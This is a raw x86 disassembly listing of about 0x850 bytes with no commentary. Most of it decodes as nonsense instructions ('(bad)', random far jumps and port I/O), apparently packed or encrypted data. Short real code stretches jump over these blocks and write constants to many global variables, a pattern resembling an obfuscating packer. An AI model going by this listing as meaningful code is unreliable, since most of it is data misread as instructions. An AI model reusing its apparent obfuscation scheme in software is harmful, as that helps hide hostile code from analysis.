  402a81:	mov    WORD PTR [ebp+0xf],?
  402a84:	fcmovnbe st,st(0)
  402a86:	sub    esp,DWORD PTR [ecx+0x27472687]
  402a8c:	(bad)  
  402a8d:	lds    ecx,FWORD PTR [ebx+eiz*1+0x5e]
  402a91:	fldenv ds:0xbab55bad
  402a97:	mov    edx,0xfbf47284
  402a9c:	add    esp,DWORD PTR [edi]
  402a9e:	fnsave [esi-0x5e]
  402aa1:	cmp    ecx,DWORD PTR [esi+0x2c238984]
  402aa7:	test   DWORD PTR [ecx+0x3e],edi
  402aaa:	xchg   DWORD PTR [edx-0x48ea388f],edi
  402ab0:	dec    esi
  402ab1:	loop   0x402a9b
  402ab3:	je     0x402af5
  402ab5:	mov    BYTE PTR [esi+ebp*2+0x66439df7],al
  402abc:	push   es
  402abd:	dec    ebp
  402abe:	inc    ebx
  402abf:	mov    ebx,0xc10bf312
  402ac4:	mov    ch,0x4a
  402ac6:	pop    edx
  402ac7:	data16 sti 
  402ac9:	jecxz  0x402aa4
  402acb:	(bad)  
  402acd:	call   0x90796c63
  402ad2:	out    0xe2,al
  402ad4:	sahf   
  402ad5:	inc    esi
  402ad6:	pop    edi
  402ad7:	ds xor eax,0xc04dad2c
  402add:	add    eax,0xf5ada986
  402ae2:	fsubr  DWORD PTR [edx]
  402ae4:	pushf  
  402ae5:	aas    
  402ae6:	pop    esp
  402ae7:	sahf   
  402ae8:	push   0x2e
  402aea:	push   cs
  402aeb:	jb     0x402adb
  402aed:	retf   
  402aee:	jae    0x402b1b
  402af0:	pop    edx
  402af1:	leave  
  402af2:	mov    cl,0xac
  402af4:	add    esi,esi
  402af6:	xchg   bl,dl
  402af8:	mov    ah,0xae
  402afa:	addr16 push cs
  402afc:	cdq    
  402afd:	sahf   
  402afe:	xchg   ebx,eax
  402aff:	inc    esp
  402b00:	jmp    0x402aaa
  402b02:	xchg   ebp,eax
  402b03:	sub    ebp,esp
  402b05:	or     eax,0xe011a78c
  402b0a:	retf   
  402b0b:	mov    edx,0xeb1cf315
  402b10:	add    al,0x3e
  402b12:	pop    es
  402b13:	retf   
  402b14:	cmc    
  402b15:	add    DWORD PTR [esi+0x79d74ca2],esp
  402b1b:	jmp    0xc054:0x6110c2b3
  402b22:	sub    al,0xfd
  402b24:	xor    esi,DWORD PTR [edx-0x2e]
  402b27:	jmp    0xe7c8968a
  402b2c:	mov    ebp,0xdcc6745c
  402b31:	out    0x3c,al
  402b33:	push   eax
  402b34:	pop    edx
  402b35:	jb     0x402ba9
  402b37:	mov    esp,0x48acdbea
  402b3c:	mov    bh,0x34
  402b3e:	rol    BYTE PTR [ebp+0x3b],0x67
  402b42:	lock and DWORD PTR [edi],ebp
  402b45:	inc    eax
  402b46:	and    al,0x99
  402b48:	mov    dh,0x5b
  402b4a:	pushf  
  402b4b:	hlt    
  402b4c:	jmp    FWORD PTR [ecx+0x15c42682]
  402b52:	paddusw mm2,QWORD PTR [edx-0x4fa940d1]
  402b59:	in     al,0x81
  402b5b:	mov    BYTE PTR [edx-0x2b],dh
  402b5e:	jns    0x402bba
  402b60:	sbb    eax,0x99394583
  402b65:	in     eax,0x15
  402b67:	mov    DWORD PTR [edx+0x6850517e],edi
  402b6d:	fisttp WORD PTR ds:0x1d810000
  402b73:	xlat   BYTE PTR ds:[ebx]
  402b74:	add    DWORD PTR [edx+0x0],0xffffffe0
  402b78:	inc    ecx
  402b79:	add    BYTE PTR [eax],al
  402b7b:	push   0x2d0f
  402b80:	call   0x4220ab
  402b85:	mov    ecx,DWORD PTR [ebp-0x68]
  402b88:	not    edx
  402b8a:	mov    edx,DWORD PTR [ebp-0x64]
  402b8d:	cmp    DWORD PTR ds:0x4282c3,0x0
  402b94:	mov    edx,DWORD PTR ds:0x4283d7
  402b9a:	mov    DWORD PTR ds:0x4281cf,0x2873
  402ba4:	movzx  edx,WORD PTR ds:0x428273
  402bab:	jmp    0x402c06
  402bb0:	mov    DWORD PTR ds:0x42834b,ebx
  402bb6:	cmp    DWORD PTR ds:0x4282c3,0x0
  402bbd:	jb     0x402be8
  402bc3:	push   DWORD PTR [ebp-0x1c]
  402bc6:	call   DWORD PTR ds:0x428dc4
  402bcc:	mov    edx,DWORD PTR ds:0x4282d3
  402bd2:	add    DWORD PTR ds:0x4282ab,edx
  402bd8:	mov    DWORD PTR ds:0x42834f,0x7648
  402be2:	adc    edx,DWORD PTR ds:0x42828b
  402be8:	mov    edx,DWORD PTR ds:0x42835b
  402bee:	sbb    DWORD PTR ds:0x4282e7,edx
  402bf4:	mov    edx,DWORD PTR ds:0x4282a3
  402bfa:	xor    DWORD PTR ds:0x428367,edx
  402c00:	and    edx,DWORD PTR ds:0x42833f
  402c06:	xor    eax,ecx
  402c08:	mov    ecx,DWORD PTR [ebp-0x70]
  402c0b:	xor    edx,0x594e
  402c11:	mov    edx,DWORD PTR [ebp-0x6c]
  402c14:	add    DWORD PTR ds:0x42826b,0x7b5b
  402c1e:	sub    eax,ecx
  402c20:	mov    ecx,DWORD PTR ds:0x428213
  402c26:	mov    ecx,DWORD PTR [ecx]
  402c28:	and    DWORD PTR ds:0x42829b,ecx
  402c2e:	mov    ecx,DWORD PTR ds:0x4225c8
  402c34:	or     DWORD PTR ds:0x428193,0x509d
  402c3e:	lea    eax,[eax+ecx*1-0x27d2]
  402c45:	mov    ecx,DWORD PTR [ebp-0x1c]
  402c48:	mov    edx,DWORD PTR [ebp-0x2c]
  402c4b:	sbb    DWORD PTR ds:0x42833b,0x9f0
  402c55:	or     ecx,0x4f00
  402c5b:	add    DWORD PTR ds:0x4283cf,0x4283ab
  402c65:	jmp    0x403043
  402c6a:	nop
  402c6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c6c:	(bad)  
  402c6d:	call   0x1caec68c
  402c72:	int    0x3e
  402c74:	cmp    DWORD PTR [ebx+eiz*4+0x8],0xffffffd3
  402c79:	mov    esp,0x1818f4b6
  402c7e:	sahf   
  402c7f:	adc    bl,BYTE PTR [eax]
  402c81:	sbb    BYTE PTR [ecx-0x31efa64],bl
  402c87:	out    0xa1,eax
  402c89:	mov    ch,0x41
  402c8b:	not    BYTE PTR [ebx+0x59a886f8]
  402c91:	sbb    al,0x65
  402c93:	mov    edi,DWORD PTR [ecx-0x71]
  402c96:	xchg   edx,eax
  402c97:	inc    ecx
  402c98:	xor    BYTE PTR [ecx],ah
  402c9a:	ja     0x402cbd
  402c9c:	cli    
  402c9d:	ds adc al,0x1d
  402ca0:	fcom   QWORD PTR [ecx-0x4d27cba1]
  402ca6:	test   ah,bh
  402ca8:	imul   edx,ecx,0xffffff88
  402cab:	dec    eax
  402cac:	add    ah,bh
  402cae:	and    BYTE PTR [esi+0x2f],0x61
  402cb2:	bound  ebx,QWORD PTR [esi]
  402cb4:	cld    
  402cb5:	push   esp
  402cb6:	xchg   BYTE PTR [ebx+0x2efdcae1],bl
  402cbc:	sub    al,0x4
  402cbe:	pop    ds
  402cbf:	xchg   ebx,eax
  402cc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cc1:	add    eax,0x1fffb9dd
  402cc6:	xor    al,0x59
  402cc8:	jo     0x402cbb
  402cca:	cmc    
  402ccb:	xlat   BYTE PTR ds:[ebx]
  402ccc:	ja     0x402d0d
  402cce:	mov    ch,0xae
  402cd0:	sti    
  402cd1:	jno    0x402ced
  402cd3:	and    BYTE PTR [edi+0x65],dh
  402cd6:	push   ds
  402cd7:	out    0xa7,eax
  402cd9:	dec    edx
  402cda:	fisttp WORD PTR [edi+ecx*1-0x74]
  402cde:	inc    edi
  402cdf:	mov    ebp,0x4862d5f1
  402ce4:	repnz ins DWORD PTR es:[edi],dx
  402ce6:	xchg   DWORD PTR [ebx+0x46],ebx
  402ce9:	into   
  402cea:	stos   DWORD PTR es:[edi],eax
  402ceb:	mov    edx,DWORD PTR [ebp+0x50]
  402cee:	into   
  402cef:	ret    
  402cf0:	jae    0x402cee
  402cf2:	jns    0x402d6d
  402cf4:	and    BYTE PTR [eax],0x5d
  402cf7:	add    esi,esi
  402cf9:	shl    BYTE PTR [esi-0x1e],cl
  402cfc:	fistp  QWORD PTR [ebx-0x69dcf2ea]
  402d02:	lods   eax,DWORD PTR ds:[esi]
  402d03:	dec    ebx
  402d04:	js     0x402cbf
  402d06:	add    DWORD PTR [esi+0x2b],0xfffffffc
  402d0a:	jmp    0x50d6:0x19614ba0
  402d11:	sti    
  402d12:	aas    
  402d13:	ja     0x402d6d
  402d15:	in     eax,dx
  402d16:	mov    edi,0x4d472f39
  402d1b:	mov    ds:0x589bf550,al
  402d20:	icebp  
  402d21:	mov    eax,0x8c399975
  402d26:	inc    edx
  402d27:	(bad)  
  402d28:	aad    0x92
  402d2a:	jae    0x402cce
  402d2c:	push   cs
  402d2d:	jbe    0x402d63
  402d2f:	dec    esi
  402d30:	xchg   edx,esi
  402d32:	xchg   esp,eax
  402d33:	xor    DWORD PTR [esi+eiz*1-0x11db0049],ecx
  402d3a:	jge    0x402d47
  402d3c:	pop    ecx
  402d3d:	(bad)  
  402d3f:	inc    ebp
  402d40:	pop    edi
  402d41:	out    dx,eax
  402d42:	outs   dx,BYTE PTR ds:[esi]
  402d43:	push   esi
  402d44:	jb     0x402d8d
  402d46:	adc    eax,0x22094e31
  402d4b:	dec    edi
  402d4c:	dec    edi
  402d4d:	push   esi
  402d4e:	(bad)  
  402d50:	imul   ebx,DWORD PTR [edx-0x2a927f57],0x71
  402d57:	xchg   ecx,eax
  402d58:	and    DWORD PTR ds:0x6c4f6c46,ebp
  402d5e:	in     eax,dx
  402d5f:	ja     0x402d03
  402d61:	pop    edx
  402d62:	(bad)  
  402d63:	sub    al,0x5b
  402d65:	lahf   
  402d66:	adc    BYTE PTR [edx-0x2e],cl
  402d69:	xor    eax,DWORD PTR [ebx+eax*8+0x53]
  402d6d:	popf   
  402d6e:	dec    eax
  402d6f:	jmp    0x402cf7
  402d71:	adc    DWORD PTR [ecx+eiz*1],ebx
  402d74:	es push edx
  402d76:	std    
  402d77:	adc    ch,BYTE PTR [edi+0x4f]
  402d7a:	inc    edx
  402d7b:	jp     0x402d21
  402d7d:	add    al,0x4a
  402d7f:	popa   
  402d80:	push   ecx
  402d81:	pop    esp
  402d82:	aad    0xa8
  402d84:	mov    ch,0xcc
  402d86:	or     cl,bl
  402d88:	jg     0x402ded
  402d8a:	sub    BYTE PTR [edi],cl
  402d8c:	cmp    BYTE PTR [esi+0x9],al
  402d8f:	and    dl,BYTE PTR [ebp+0x51d2bf4a]
  402d95:	xor    eax,0xe1da9de
  402d9a:	aas    
  402d9b:	fistp  WORD PTR [edi]
  402d9d:	mov    ch,0x22
  402d9f:	dec    DWORD PTR [eax+esi*4+0x17]
  402da3:	sub    esi,DWORD PTR [edx+0x5b7846f8]
  402da9:	pop    ds
  402daa:	dec    eax
  402dab:	shl    DWORD PTR ds:0xcb1a0822,cl
  402db1:	fs push ebx
  402db3:	scas   eax,DWORD PTR es:[edi]
  402db4:	mov    eax,ds:0x665c6e62
  402db9:	je     0x402e1c
  402dbb:	xlat   BYTE PTR ds:[ebx]
  402dbc:	cmc    
  402dbd:	fucomp st(5)
  402dbf:	test   BYTE PTR ds:0xe0521e55,dl
  402dc5:	pop    edi
  402dc6:	inc    edx
  402dc7:	lock sub cl,BYTE PTR ds:[ebp-0x50]
  402dcc:	neg    BYTE PTR [ebp+0x5]
  402dcf:	test   eax,0x2118f33f
  402dd4:	lods   al,BYTE PTR ds:[esi]
  402dd5:	mov    ds:0x784403ed,al
  402dda:	clc    
  402ddb:	pop    esi
  402ddc:	inc    ecx
  402ddd:	add    esi,DWORD PTR [eax+0x76e7f5bc]
  402de3:	push   edi
  402de4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402de5:	sti    
  402de6:	stos   DWORD PTR es:[edi],eax
  402de7:	ret    0x86ac
  402dea:	stos   DWORD PTR es:[edi],eax
  402deb:	test   bh,0x80
  402dee:	cdq    
  402def:	and    eax,0x59d4ad18
  402df4:	mov    fs,WORD PTR cs:[ebp+0x690ab04e]
  402dfb:	fs push es
  402dfd:	inc    edx
  402dfe:	xchg   ecx,eax
  402dff:	in     al,dx
  402e00:	fistp  DWORD PTR [edi+0x4ee33400]
  402e06:	ja     0x402dc4
  402e08:	aaa    
  402e09:	clc    
  402e0a:	adc    edi,DWORD PTR [ecx-0x38]
  402e0d:	idiv   DWORD PTR [edi+0x7e]
  402e10:	(bad)  
  402e11:	mov    ds:0xa4e23096,al
  402e16:	and    al,0x12
  402e18:	bound  ebx,QWORD PTR [ebx]
  402e1a:	leave  
  402e1b:	ins    BYTE PTR es:[edi],dx
  402e1c:	mov    edx,0x4ea3db36
  402e21:	xor    eax,0xec3b1cd9
  402e26:	mov    ebp,DWORD PTR [ebp-0x6b308682]
  402e2c:	sub    BYTE PTR [edi],ch
  402e2e:	pop    esi
  402e2f:	(bad)  
  402e30:	loopne 0x402e30
  402e32:	call   0x22a2538f
  402e37:	test   DWORD PTR [esi+0x76],edx
  402e3a:	sahf   
  402e3b:	neg    DWORD PTR [edx]
  402e3d:	mov    bh,0x36
  402e3f:	fiadd  WORD PTR [esi+0xd]
  402e42:	in     eax,0xd7
  402e44:	data16 aad 0x3
  402e47:	xchg   ebx,eax
  402e48:	out    0xf8,al
  402e4a:	je     0x402e2f
  402e4c:	mov    edx,0xa87d8bda
  402e51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e52:	jmp    0xae07:0x8f8c336b
  402e59:	call   0x94e9:0x86a6a5fc
  402e60:	stos   DWORD PTR es:[edi],eax
  402e61:	imul   esi,DWORD PTR [eax-0x72],0xffffffa2
  402e65:	xchg   ebp,eax
  402e66:	sub    ah,BYTE PTR cs:[ecx-0x7b01c517]
  402e6d:	nop
  402e6e:	bound  eax,QWORD PTR [ecx-0x4c]
  402e71:	cdq    
  402e72:	jmp    0x6988:0x2d20058f
  402e79:	xchg   BYTE PTR [ecx-0x6f],cl
  402e7c:	sbb    edx,edx
  402e7e:	pop    ebx
  402e7f:	push   esi
  402e80:	xchg   ecx,eax
  402e81:	push   cs
  402e82:	cmp    BYTE PTR [ecx],bl
  402e84:	inc    edx
  402e85:	icebp  
  402e86:	cdq    
  402e87:	mov    cl,0xd5
  402e89:	sbb    DWORD PTR [esi+0x4b],0xffffffd2
  402e8d:	jmp    0x402e19
  402e8f:	jle    0x402f04
  402e91:	or     al,0xf5
  402e93:	pop    ecx
  402e94:	sub    bl,cl
  402e96:	sub    DWORD PTR [eax],eax
  402e98:	jecxz  0x402f17
  402e9a:	ret    0xc17
  402e9d:	cmp    dh,BYTE PTR [edx]
  402e9f:	(bad)  
  402ea0:	pop    esp
  402ea1:	out    0xfc,eax
  402ea3:	and    dl,0x2e
  402ea6:	pop    ss
  402ea7:	cs pop es
  402ea9:	push   edi
  402eaa:	adc    cl,cl
  402eac:	ficomp WORD PTR [esi-0x1197e8ed]
  402eb2:	loopne 0x402e5a
  402eb4:	daa    
  402eb5:	icebp  
  402eb6:	ja     0x402f30
  402eb8:	mov    eax,0x4b4f6487
  402ebd:	test   ebp,ebx
  402ebf:	cld    
  402ec0:	cmp    bl,bl
  402ec2:	cld    
  402ec3:	shr    BYTE PTR [eax],cl
  402ec5:	out    dx,eax
  402ec6:	mov    ebx,0x47ba1b89
  402ecb:	clc    
  402ecc:	in     al,dx
  402ecd:	and    al,0xa5
  402ecf:	cdq    
  402ed0:	push   es
  402ed1:	test   esp,0x80d180b5
  402ed7:	or     al,0xef
  402ed9:	daa    
  402eda:	xchg   ebx,eax
  402edb:	xor    al,0xa
  402edd:	aam    0xc8
  402edf:	outs   dx,BYTE PTR ds:[esi]
  402ee0:	or     al,0xd9
  402ee2:	outs   dx,DWORD PTR ds:[esi]
  402ee3:	out    dx,eax
  402ee4:	daa    
  402ee5:	inc    ebp
  402ee6:	imul   ecx,edi,0x72
  402ee9:	xor    edi,DWORD PTR [ebx]
  402eeb:	adc    edi,DWORD PTR [edx+esi*1+0x29d41c75]
  402ef2:	pop    ecx
  402ef3:	jb     0x402ee4
  402ef5:	lods   eax,DWORD PTR ds:[esi]
  402ef6:	ss jle 0x402ec5
  402ef9:	sbb    BYTE PTR [ebx+0x56],bl
  402efc:	mov    cl,0x80
  402efe:	mov    eax,ds:0x3b8c819f
  402f03:	test   esp,edx
  402f05:	fcmovbe st,st(0)
  402f07:	jo     0x402eb7
  402f09:	sub    BYTE PTR [eax+eiz*4+0x2f01f965],ah
  402f10:	adc    eax,DWORD PTR [eax-0x15]
  402f13:	xlat   BYTE PTR ds:[ebx]
  402f14:	arpl   bx,sp
  402f16:	stos   DWORD PTR es:[edi],eax
  402f17:	sub    al,0x7c
  402f19:	jno    0x402f4f
  402f1b:	test   BYTE PTR ds:0xa1ca231,bl
  402f21:	into   
  402f22:	outs   dx,DWORD PTR ds:[esi]
  402f23:	xchg   ecx,eax
  402f24:	push   esi
  402f25:	push   ss
  402f26:	js     0x402f21
  402f28:	dec    ecx
  402f29:	sub    eax,0x2cfd69f5
  402f2e:	push   ebx
  402f2f:	dec    esp
  402f30:	popf   
  402f31:	ror    bh,0x74
  402f34:	lods   eax,DWORD PTR ds:[esi]
  402f35:	push   ebx
  402f36:	push   eax
  402f37:	das    
  402f38:	and    DWORD PTR [edi],ebp
  402f3a:	xor    edi,DWORD PTR [ebx-0x1f9b8f5c]
  402f40:	fyl2xp1 
  402f42:	fcmove st,st(2)
  402f44:	stos   DWORD PTR es:[edi],eax
  402f45:	test   BYTE PTR [edi+ecx*2-0x2432f9a5],bl
  402f4c:	adc    bl,BYTE PTR [edi]
  402f4e:	jo     0x402fc6
  402f50:	pop    ebp
  402f51:	loop   0x402f44
  402f53:	stc    
  402f54:	add    al,0xf2
  402f56:	add    al,0xec
  402f58:	es (bad) 
  402f5a:	cmp    ch,BYTE PTR [esi]
  402f5c:	cmc    
  402f5d:	mov    edi,0x30adc35a
  402f62:	push   esp
  402f63:	mov    ebx,DWORD PTR [ebx]
  402f65:	enter  0x96e4,0x30
  402f69:	push   esp
  402f6a:	mov    DWORD PTR [edi],0x60bb83f2
  402f70:	retf   
  402f71:	adc    BYTE PTR [edi+eax*4],0x67
  402f75:	lds    edx,FWORD PTR [ebx+0x66]
  402f78:	dec    ebp
  402f79:	(bad)  
  402f7a:	mov    ch,0x4e
  402f7c:	inc    edx
  402f7d:	les    eax,FWORD PTR [esi+0x1bd07025]
  402f83:	(bad)  
  402f84:	pushf  
  402f85:	mov    ebx,0xe9767347
  402f8a:	adc    bl,BYTE PTR [eax+0x43]
  402f8d:	cwde   
  402f8e:	add    al,0x97
  402f90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f91:	pop    esi
  402f92:	loop   0x402f85
  402f94:	push   ss
  402f95:	cli    
  402f96:	push   es
  402f97:	or     BYTE PTR [edx+edx*1+0x7671391],al
  402f9e:	adc    al,0x50
  402fa0:	ror    ch,0x36
  402fa3:	adc    dl,BYTE PTR [ebx]
  402fa5:	mov    esp,0x5f80b16e
  402faa:	in     eax,0xc7
  402fac:	idiv   BYTE PTR ds:0x884e4282
  402fb2:	test   edi,edx
  402fb4:	or     BYTE PTR [ebp-0x3f],bh
  402fb7:	add    dh,al
  402fb9:	jle    0x40301c
  402fbb:	fcom   QWORD PTR [edx+edx*1-0x4f]
  402fbf:	push   eax
  402fc0:	jne    0x402fdf
  402fc2:	fimul  DWORD PTR [eax]
  402fc4:	aam    0x5a
  402fc6:	mov    ds:0x30af5205,eax
  402fcb:	and    DWORD PTR [ebp-0x26e67c03],0x16a928e1
  402fd5:	in     eax,0x18
  402fd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fd8:	mov    esp,DWORD PTR [ecx+0x25]
  402fdb:	std    
  402fdc:	push   0x7c
  402fde:	jmp    0x402f65
  402fe0:	popa   
  402fe1:	shl    DWORD PTR [ebx-0x819d803],1
  402fe7:	std    
  402fe8:	mov    cl,0x4b
  402fea:	scas   eax,DWORD PTR es:[di]
  402fec:	jecxz  0x403056
  402fee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402fef:	jno    0x403063
  402ff1:	xor    BYTE PTR [edx-0x23],dh
  402ff4:	lahf   
  402ff5:	test   DWORD PTR [edx],0x887ad190
  402ffb:	ror    BYTE PTR [esp+ecx*2],cl
  402ffe:	stc    
  402fff:	xchg   edi,eax
  403000:	and    ch,ch
  403002:	loopne 0x402ffb
  403004:	mov    eax,0x1ca098ec
  403009:	cmp    DWORD PTR [ecx-0x368aa6a1],esp
  40300f:	mov    al,ds:0xd12c35e6
  403014:	inc    ecx
  403015:	adc    dh,BYTE PTR [ebp+0x2813d8e2]
  40301b:	out    dx,al
  40301c:	int    0x16
  40301e:	jnp    0x40302f
  403020:	adc    BYTE PTR [ecx],dh
  403022:	int3   
  403023:	inc    edx
  403024:	or     dl,BYTE PTR ds:0x8b679f2b
  40302a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40302b:	loopne 0x40306e
  40302d:	daa    
  40302e:	or     dl,BYTE PTR [ebx+0x38]
  403031:	scas   al,BYTE PTR es:[edi]
  403032:	sbb    dl,bl
  403034:	fisttp QWORD PTR [ecx-0x3d]
  403037:	fstp   QWORD PTR [ebp+0x27cb2e9f]
  40303d:	fimul  DWORD PTR [esi-0x55f22e8b]
  403043:	and    ecx,edx
  403045:	add    edx,0x3463
  40304b:	mov    edx,DWORD PTR [ebp-0x34]
  40304e:	or     ecx,edx
  403050:	xor    ecx,0x5fdd
  403056:	cmp    ecx,DWORD PTR [eax]
  403058:	mov    DWORD PTR ds:0x4282db,0x665d
  403062:	jne    0x40a9b0
  403068:	mov    ecx,DWORD PTR [esi]
  40306a:	cmp    DWORD PTR ds:0x4283df,0x0
  403071:	mov    DWORD PTR ds:0x4283e3,edx
  403077:	mov    DWORD PTR ds:0x42832b,0x1413
  403081:	mov    edx,DWORD PTR ds:0x4283d3
  403087:	jmp    0x4030db
  40308c:	mov    DWORD PTR ds:0x42819f,0x4beb
  403096:	not    eax
  403098:	cmp    DWORD PTR ds:0x4283df,0x0
  40309f:	jl     0x4030c1
  4030a5:	push   DWORD PTR [ebp-0x20]
  4030a8:	push   DWORD PTR [ebp-0xc]
  4030ab:	call   DWORD PTR ds:0x428de4
  4030b1:	mov    DWORD PTR ds:0x42828b,0x4e29
  4030bb:	inc    DWORD PTR ds:0x4282af
  4030c1:	or     edx,DWORD PTR ds:0x42834b
  4030c7:	add    edx,DWORD PTR ds:0x4281cf
  4030cd:	sub    edx,edx
  4030cf:	add    DWORD PTR ds:0x4283d7,edx
  4030d5:	sbb    edx,DWORD PTR ds:0x42835f
  4030db:	mov    eax,DWORD PTR [esi+0x4]
  4030de:	sbb    edx,DWORD PTR ds:0x4283c3
  4030e4:	shrd   ecx,eax,0x2
  4030e8:	shr    eax,0x2
  4030eb:	mov    eax,DWORD PTR [esi]
  4030ed:	xor    DWORD PTR ds:0x4283e3,edx
  4030f3:	mov    edx,DWORD PTR [esi+0x4]
  4030f6:	neg    DWORD PTR ds:0x42819b
  4030fc:	shl    eax,0x1e
  4030ff:	xor    ecx,edi
  403101:	xor    eax,eax
  403103:	sbb    DWORD PTR ds:0x4283e7,0x1e67
  40310d:	or     eax,ecx
  40310f:	jmp    0x4034ed
  403114:	and    al,0xd6
  403116:	push   esp
  403117:	repnz and dh,BYTE PTR [ebx+0x22]
  40311b:	inc    esi
  40311c:	sar    BYTE PTR [eax-0x73],1
  40311f:	jo     0x403181
  403121:	add    esp,DWORD PTR [ebx]
  403123:	stos   BYTE PTR es:[edi],al
  403124:	cmp    eax,0x9e1818ec
  403129:	adc    bl,BYTE PTR [eax]
  40312b:	sbb    BYTE PTR [eax-0x4a],ah
  40312e:	dec    eax
  40312f:	daa    
  403130:	fild   DWORD PTR [edi-0x62]
  403133:	fcomp  QWORD PTR [ebp-0x376c3d63]
  403139:	or     BYTE PTR [ebx],al
  40313b:	imul   edi,DWORD PTR [eax],0x8b199deb
  403141:	xchg   BYTE PTR [edx+ecx*4],al
  403144:	mov    esp,0x3ddf7e91
  403149:	or     al,BYTE PTR [ebp+0x58fe0c2e]
  40314f:	add    ch,BYTE PTR [ebp-0x4ec01faf]
  403155:	pop    edx
  403156:	popa   
  403157:	sti    
  403158:	mov    bh,0x50
  40315a:	or     esi,esp
  40315c:	(bad)  
  40315e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40315f:	add    DWORD PTR [ebp+0x6ff86d16],0x48e956b7
  403169:	(bad)  
  40316a:	in     eax,dx
  40316b:	stc    
  40316c:	icebp  
  40316d:	mov    eax,ds:0xc36758fb
  403172:	push   ebp
  403173:	pop    ecx
  403174:	jo     0x40314e
  403176:	mov    WORD PTR [ecx-0x29],fs
  403179:	and    al,0x2a
  40317b:	(bad)  
  40317c:	sahf   
  40317d:	inc    esi
  40317e:	and    DWORD PTR [edx],edi
  403180:	aam    0x31
  403182:	push   0xe9bdd490
  403187:	push   ecx
  403188:	add    ch,bh
  40318a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40318b:	or     dl,BYTE PTR [ecx+edi*1-0x2030f984]
  403192:	mov    BYTE PTR [ebx+0x7d9849c8],0x4b
  403199:	stc    
  40319a:	shl    DWORD PTR [esi+0x25],cl
  40319d:	cmc    
  40319e:	inc    edx
  40319f:	test   BYTE PTR [eax-0x4d],ch
  4031a2:	inc    esi
  4031a3:	aas    
  4031a4:	loopne 0x40315e
  4031a6:	adc    al,0xdb
  4031a8:	sbb    eax,DWORD PTR [esi-0x27]
  4031ab:	sub    DWORD PTR ds:0xf0e6574b,edi
  4031b1:	repnz adc eax,0xdbfe06ce
  4031b7:	xchg   ebp,eax
  4031b8:	mov    ?,WORD PTR [ecx]
  4031ba:	mov    al,0x14
  4031bc:	and    ebx,DWORD PTR [eax-0x674c6bb6]
  4031c2:	sar    bl,1
  4031c4:	mov    al,ds:0x42b36559
  4031c9:	jg     0x403199
  4031cb:	push   edx
  4031cc:	mov    esi,0x644afd58
  4031d1:	daa    
  4031d2:	jno    0x403202
  4031d4:	push   ds
  4031d5:	fld    QWORD PTR [ebx]
  4031d7:	mov    WORD PTR [edi+edi*2],cs
  4031da:	cs iret 
  4031dc:	and    eax,0x86d36232
  4031e1:	add    DWORD PTR [edx],ebx
  4031e3:	retf   0x8f72
  4031e6:	jl     0x4031be
  4031e8:	aas    
  4031e9:	ins    BYTE PTR es:[edi],dx
  4031ea:	lds    edi,FWORD PTR ds:0xe9016667
  4031f0:	push   edi
  4031f1:	(bad)  
  4031f2:	stos   DWORD PTR es:[edi],eax
  4031f3:	es rcl ebp,cl
  4031f6:	push   0xfffffffa
  4031f8:	jp     0x40326c
  4031fa:	ret    0x308f
  4031fd:	inc    esp
  4031fe:	fdiv   st(3),st
  403200:	ffree  st(5)
  403202:	add    eax,0x5a129d61
  403207:	lea    ecx,[ecx+ebx*2+0x70228967]
  40320e:	sub    BYTE PTR [edx+0x37ef6a09],0x40
  403215:	fs addr16 call 0x6aef:0x2e825421
  40321e:	ret    
  40321f:	aas    
  403220:	add    eax,0xf59b3821
  403225:	test   eax,0xc48ccc71
  40322a:	xchg   ecx,eax
  40322b:	mov    cl,BYTE PTR [edi-0x74]
  40322e:	push   0x96f590d8
  403233:	sbb    al,0xea
  403235:	cs (bad) 
  403237:	or     eax,0xdf0486b0
  40323c:	pop    ebx
  40323d:	(bad)
  403241:	fdiv   QWORD PTR [eax]
  403243:	mov    edx,0xbd8ab01f
  403248:	sub    bl,bl
  40324a:	pop    ebx
  40324b:	stos   DWORD PTR es:[edi],eax
  40324c:	lods   eax,DWORD PTR ds:[esi]
  40324d:	pop    esi
  40324e:	ja     0x40326f
  403250:	push   eax
  403251:	jo     0x40322c
  403253:	or     esp,0x9c141ff7
  403259:	push   esp
  40325a:	jle    0x403201
  40325c:	repnz outs dx,DWORD PTR ds:[esi]
  40325e:	pop    edi
  40325f:	fxch   st(7)
  403261:	sti    
  403262:	fwait
  403263:	jle    0x403274
  403265:	ins    BYTE PTR es:[edi],dx
  403266:	jno    0x403257
  403268:	cmp    DWORD PTR [edx-0x6fbf715],edx
  40326e:	(bad)  
  40326f:	call   0xf1c64c0d
  403274:	pop    ebp
  403275:	fstp   TBYTE PTR [edx-0x3b950509]
  40327b:	sti    
  40327c:	mov    eax,0xed0b29d9
  403281:	push   eax
  403282:	int3   
  403283:	stos   BYTE PTR es:[edi],al
  403284:	es pop esi
  403286:	fmulp  st(7),st
  403288:	inc    esi
  403289:	jno    0x40321b
  40328b:	lock cmc 
  40328d:	out    0x4b,eax
  40328f:	clc    
  403290:	or     eax,0x44208
  403295:	add    eax,DWORD PTR cs:[edi-0x4a]
  403299:	sahf   
  40329a:	mov    ah,dl
  40329c:	pusha  
  40329d:	icebp  
  40329e:	mov    bh,0x77
  4032a0:	mov    ebp,0x7a47a23c
  4032a5:	test   eax,0xbcd154c8
  4032aa:	mov    WORD PTR [ebx+0x1d],?
  4032ad:	dec    esi
  4032ae:	mov    eax,ds:0x82262dd3
  4032b3:	sub    edi,DWORD PTR [eax-0x28ea871a]
  4032b9:	fimul  WORD PTR [edx-0x7f]
  4032bc:	sahf   
  4032bd:	inc    esp
  4032be:	sub    dl,BYTE PTR [edx-0x4e]
  4032c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032c2:	jmp    0x403312
  4032c4:	jl     0x4032f1
  4032c6:	dec    ebp
  4032c7:	dec    ebx
  4032c8:	shl    BYTE PTR cs:[ebx-0x28b82f7f],0x32
  4032d0:	push   esi
  4032d1:	jl     0x403318
  4032d3:	mov    ah,0xc0
  4032d5:	dec    ebp
